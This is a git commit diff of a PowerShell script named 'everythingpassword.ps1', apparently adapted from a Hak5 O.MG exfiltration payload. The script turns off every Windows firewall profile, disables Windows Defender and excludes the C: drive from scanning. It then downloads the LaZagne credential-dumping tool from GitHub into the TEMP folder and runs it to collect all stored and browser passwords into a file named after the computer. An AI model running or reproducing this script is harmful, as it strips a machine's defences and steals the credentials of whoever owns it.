eb451cbad3106db9cd83a0f257b95d42494f61a2
atnguyen200 <anthony.nguyen@jetzero.aero>
2025-11-05 10:44:09 -0800

    Update everythingpassword.ps1

--- everythingpassword.ps1
+++ everythingpassword.ps1
@@ -4,4 +4,7 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
 Add-MpPreference -ExclusionPath "C:"
 $Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine');Start-BitsTransfer https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe -Destination "$Test/l.exe"; cd $Test
+
 .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
+
+## referenced from https://github.com/hak5/omg-payloads/blob/master/payloads/library/exfiltration/Everything-Password-Stealer/payload.txt
